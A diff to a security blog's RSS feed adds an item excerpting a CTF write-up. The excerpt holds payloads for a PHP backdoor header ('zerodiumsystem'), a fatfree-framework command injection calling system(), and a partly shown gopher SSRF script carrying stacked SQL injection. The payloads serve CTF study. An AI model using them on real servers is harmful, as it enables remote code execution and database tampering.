@@ -6,7 +6,28 @@
     <description>Recent content in SSRF on wh1sper</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Wed, 28 Oct 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/ssrf/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 04 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/ssrf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>虎符CTF Writeup by X1cT34m</title>
+      <link>https://anthem-whisper.github.io/p/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/</link>
+      <pubDate>Sun, 04 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/</guid>
+      <description>MISC 你会日志分析吗 时间注入，手撸日志得到ascii码，转换到ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==，base64解密
+Web 签到 签到访问任意PHP文件，User-Agentt: zerodiumphpinfo();
+User-Agentt: zerodiumsystem(&amp;lsquo;cat /flag&amp;rsquo;);
+unsetme 看到是fatfree框架，github下载最新fatfree-3.7.3源码，本地index.php改成题目给的
+传参后看到debug的调用栈，本地动态调试一下
+直接在unset下断点
+跟进到base.php，看到530行左右有eval，因为是拼接执行所以猜测存在命令注入
+虽然对引号等有转义，但是绕一下就ok，调试的时候发现主要是它对[]过滤的有点问题
+?a=n[]);system($_POST[0]);echo(1 POST: 0=cat /flag flag{d77d7d9b-941a-4087-949f-c72a466f9c5b}
+“慢慢做”管理系统 第一步MD5哈希注入，密码kydba
+第二步Gopher打admin.php，存在堆叠注入，用强网杯随便注的rename改表名能得到admin_inner的账户密码
+但是登陆名需要猜解，是admin
+# python3 # wh1sper from urllib.parse import quote #username = &amp;#34;1&amp;#39;;rename table real_admin_here_do_you_find to thetmp;rename table fake_admin to real_admin_here_do_you_find;rename table thetmp to fake_admin;&amp;#34; #username = &amp;#34;1&amp;#34; username = &amp;#34;admin&amp;#34;#admin_inner/5fb4e07de914cfc82afb44vbaf402203d #我草泥马的脑瘫题 password = &amp;#34;5fb4e07de914cfc82afb44vbaf402203&amp;#34;#fake_admin/fake_passwor post_data = &amp;#34;username={}&amp;amp;password={}&amp;#34;.format(quote(username), quote(password)) cl = len(post_data) stream = &amp;#34;&amp;#34;&amp;#34;POST /flag.php HTTP/1.1 Host: 127.</description>
+    </item>
+    
     <item>
       <title>ByteCTF2020复现</title>
       <link>https://anthem-whisper.github.io/p/bytectf2020%E5%A4%8D%E7%8E%B0/</link>
